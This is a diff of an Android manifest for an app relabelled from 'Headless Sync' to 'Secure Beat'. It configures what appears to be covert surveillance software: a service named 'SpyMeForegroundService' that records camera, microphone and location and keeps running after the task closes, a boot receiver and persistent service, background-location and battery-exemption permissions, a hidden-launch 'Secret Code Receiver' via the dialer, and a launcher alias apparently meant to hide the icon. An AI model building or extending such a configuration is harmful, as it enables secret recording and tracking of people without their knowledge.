@@ -2,32 +2,33 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.anonymous.scure_beat">
 
+    <!-- Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
         android:name=".MainApplication"
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
-        android:label="Headless Sync"
+        android:label="Secure Beat"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
+        <!-- ✅ Main Activity -->
         <activity
             android:name=".MainActivity"
             android:configChanges="keyboard|keyboardHidden|orientation|screenSize|screenLayout|uiMode"
@@ -35,13 +36,13 @@
             android:windowSoftInputMode="adjustResize"
             android:theme="@style/Theme.App.SplashScreen"
             android:exported="true">
-            <!-- Must retain MAIN action and DEFAULT category to allow programmatic launch if alias is disabled -->
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </activity>
 
+        <!-- ✅ Launcher Alias -->
         <activity-alias
             android:name=".LauncherAlias"
             android:targetActivity=".MainActivity"
@@ -52,6 +53,24 @@
             </intent-filter>
         </activity-alias>
 
+        <!-- ✅ Debug Launcher -->
+        <activity
+            android:name=".DebugLauncherActivity"
+            android:label="Secure Beat (Debug)"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- ✅ Permission Handler -->
+        <activity
+            android:name=".PermissionHandlerActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="false" />
+
+        <!-- ✅ Secret Code Receiver -->
         <receiver
             android:name=".DialerReceiver"
             android:exported="true">
@@ -61,14 +80,7 @@
             </intent-filter>
         </receiver>
 
-        <activity
-            android:name=".PermissionHandlerActivity"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            android:exported="false" />
-
-
-
-
+        <!-- ✅ Services -->
         <service
             android:name=".PersistentService"
             android:enabled="true"
@@ -79,7 +91,8 @@
             android:name=".SpyMeForegroundService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="camera|microphone" />
+            android:foregroundServiceType="camera|microphone|location"
+            android:stopWithTask="false" />
 
         <service
             android:name=".ResourceManagerService"
@@ -87,6 +100,7 @@
             android:exported="false"
             android:foregroundServiceType="camera|microphone" />
 
+        <!-- ✅ Boot Receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
